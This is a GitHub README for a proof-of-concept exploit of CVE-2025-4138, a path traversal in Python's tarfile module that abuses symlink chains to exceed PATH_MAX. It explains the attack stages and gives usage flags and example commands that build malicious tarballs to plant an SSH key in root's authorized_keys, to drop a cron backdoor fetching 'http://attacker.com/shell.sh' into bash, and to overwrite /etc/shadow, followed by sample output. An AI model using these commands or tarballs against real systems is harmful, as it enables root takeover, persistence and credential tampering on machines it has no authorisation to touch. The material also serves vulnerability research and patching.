# CVE-2025-4138 - Python `tarfile` PATH_MAX Bypass PoC

> **Author:** [d3vn0mi](https://github.com/d3vn0mi)

```
   _______  _______     ____  ___ ___  ___      _ _  _ _____ ___
  / ___\ \ / / ____|   |___ \/ _ \__ \| __|    | | || |___ /( _ )
 | |    \ V /|  _| _____ __) | | | |) |__ \ ___| | || |_|_ \/ _ \
 | |___  | | | |__|_____/ __/| |_| / __/___) |___|__   _|__) \__, |
  \____| |_| |_____|   |_____|\___/_____|____/      |_||____/ /_/

  [ CVE-2025-4138 :: Python tarfile PATH_MAX Bypass ]
  [ Author: d3vn0mi                                 ]
```

## Overview

A proof-of-concept exploit for **CVE-2025-4138**, a path traversal vulnerability in Python's `tarfile` module. The vulnerability allows an attacker to craft a malicious tar archive that writes files to arbitrary locations outside the intended extraction directory by abusing symlink chains to exceed `PATH_MAX`.

## Vulnerability Details

| Field         | Value                                                  |
|---------------|--------------------------------------------------------|
| **CVE ID**    | CVE-2025-4138                                          |
| **Component** | Python `tarfile` module                                |
| **Type**      | Path Traversal (CWE-22)                                |
| **Vector**    | Symlink chain + PATH_MAX bypass                        |
| **Impact**    | Arbitrary file write outside extraction directory      |

### How It Works

The exploit operates in four stages:

1. **Path Inflation** -- A chain of deeply nested directories and symlinks is constructed so that the fully resolved path exceeds the kernel's `PATH_MAX` limit (4096 bytes on Linux).

2. **Pivot Symlink** -- A symlink is added whose resolved path crosses the `PATH_MAX` boundary. Because the path is too long to resolve, Python's `tarfile` safety checks (which rely on `os.path.realpath()`) silently fail and skip validation.

3. **Escape Symlink** -- A second symlink uses `../` traversal through the pivot to escape the extraction directory entirely and point to an attacker-controlled absolute path on the filesystem.

4. **Payload Drop** -- A regular file is written through the escape symlink, landing at the target path with attacker-controlled contents and permissions.

```
Extract dir
    |
    +-- ddd...d/          (247-char dir)
    |   +-- a -> ddd...d  (symlink shortcut)
    |   +-- ddd...d/
    |       +-- b -> ddd...d
    |       +-- ...       (16 levels deep, resolved path > 4096)
    |
    +-- a/b/.../p/lll...l -> ../../...   (pivot - PATH_MAX exceeded)
    +-- escape -> pivot + ../../... + /target/dir  (escape)
    +-- escape/target_file  <-- PAYLOAD LANDS HERE (outside extract dir)
```

## Installation

```bash
git clone https://github.com/d3vn0mi/cve_2025_4138_poc.git
cd cve_2025_4138_poc
```

No external dependencies are required -- the exploit uses only Python 3 standard library modules.

## Usage

```
usage: cve_2025_4138.py [-h] [-o OUTPUT] [-t TARGET] [-p PAYLOAD]
                        [-s PAYLOAD_STRING] [-k SSH_KEY] [-m MODE]
                        [-d DEPTH] [-v] [-q]
```

### Options

| Flag | Description |
|------|-------------|
| `-o, --output` | Output tarball path (default: `exploit.tar`) |
| `-t, --target` | Absolute path of file to write on target (default: `/root/.ssh/authorized_keys`) |
| `-p, --payload` | Path to a file whose contents become the payload |
| `-s, --payload-string` | Use a literal string as the payload |
| `-k, --ssh-key` | Path to an SSH public key file |
| `-m, --mode` | File permission mode in octal (default: `0600`) |
| `-d, --depth` | Directory traversal depth (default: `8`) |
| `-v, --verify` | Dump tarball contents after creation |
| `-q, --quiet` | Suppress the banner |

### Examples

**Write an SSH public key to root's authorized_keys:**
```bash
python3 cve_2025_4138.py -k ~/.ssh/id_rsa.pub -v
```

**Write a cron job for persistence:**
```bash
python3 cve_2025_4138.py \
  -s "* * * * * root curl http://attacker.com/shell.sh | bash" \
  -t /etc/cron.d/backdoor \
  -m 0644 \
  -o cron_exploit.tar
```

**Write arbitrary file content from a local file:**
```bash
python3 cve_2025_4138.py \
  -p payload.txt \
  -t /etc/shadow \
  -o shadow_exploit.tar \
  -v
```

### Output

```
[*] Building exploit tarball: exploit.tar
[*] Target file: /root/.ssh/authorized_keys
[*] Payload size: 574 bytes
[*] Traversal depth: 8
[*] Stage 1/4: Creating symlink chain for path inflation...
[*]   Chain link 1/16: resolved path length ~247 bytes
[*]   Chain link 2/16: resolved path length ~494 bytes
    ...
[*] Stage 2/4: Creating pivot symlink (PATH_MAX bypass)...
[*] Stage 3/4: Creating escape symlink (directory traversal)...
[*] Stage 4/4: Writing payload through escape symlink...
[+] Exploit tarball created: exploit.tar
[+] Archive size: 20480 bytes
[+] Target: /root/.ssh/authorized_keys (mode 0o600)
[+] Done. Use with caution - authorized testing only.
```

## Mitigation

- **Upgrade Python** to a patched version once a fix is released.
- **Use `tarfile.data_filter`** (Python 3.12+) which provides stricter extraction controls.
- **Never extract untrusted tar archives** as root or into sensitive directories.
- **Use `--strip-components`** or validate archive contents before extraction.
- **Apply filesystem-level protections** such as restricting symlink following (`fs.protected_symlinks`).

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse. Always obtain proper written authorization before testing against systems you do not own.

## License

This project is licensed under the MIT License.

---

**d3vn0mi** | [GitHub](https://github.com/d3vn0mi)
